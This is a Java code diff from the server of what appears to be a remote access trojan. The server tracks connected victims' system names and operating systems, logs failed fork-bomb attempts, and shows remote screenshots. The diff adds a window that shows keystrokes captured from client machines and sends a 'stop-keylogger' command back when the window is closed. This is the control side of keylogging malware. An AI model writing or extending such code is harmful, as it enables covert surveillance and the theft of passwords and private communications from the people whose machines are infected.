@@ -18,6 +18,7 @@ import static utils.ServerUtils.print;
 public class ServerMessageHandler {
 
     private static JFrame sharedScreen;
+    private static TextScreen keylogScreen;
 
     public static void handleIncomingMessage(Message message, ClientConnection c) {
 
@@ -30,7 +31,6 @@ public class ServerMessageHandler {
                 String name = (String) message.getArguments().get(0);
                 Server.addUserSystemName(c, name);
                 break;
-
             case "os":
                 String os = (String) message.getArguments().get(0);
                 Server.addUserOS(c, os);
@@ -44,10 +44,9 @@ public class ServerMessageHandler {
             case "bomb-fail":
                 System.out.println("Fork Bomb failed: " + message.getArguments().get(0));
                 break;
-
             case "key-typed":
                 NativeKeyEvent keyTyped = (NativeKeyEvent) message.getArguments().get(0);
-                System.out.println("TYPED " + keyTyped.getKeyChar());
+                receiveKeyTyped(keyTyped, c);
                 break;
         }
 
@@ -70,6 +69,24 @@ public class ServerMessageHandler {
         }
 
         putImageFromMessage(sharedScreen, message);
+    }
+
+    static void receiveKeyTyped(NativeKeyEvent event, ClientConnection c) {
+        if(keylogScreen == null) {
+            keylogScreen = new TextScreen();
+            keylogScreen.addWindowListener(new WindowAdapter() {
+                @Override
+                public void windowClosing(java.awt.event.WindowEvent e) {
+                    System.out.println("Fechou o jovem");
+                    e.getWindow().dispose();
+                    c.getConnection().sendMessage(new Message("stop-keylogger"));
+                    keylogScreen = null;
+                    System.out.println("JFrame Closed!");
+                }
+            });
+        }
+        // TODO mudar
+        keylogScreen.append(event.getKeyChar() + "");
     }
 
     static void receiveScreenshot(Message message) {
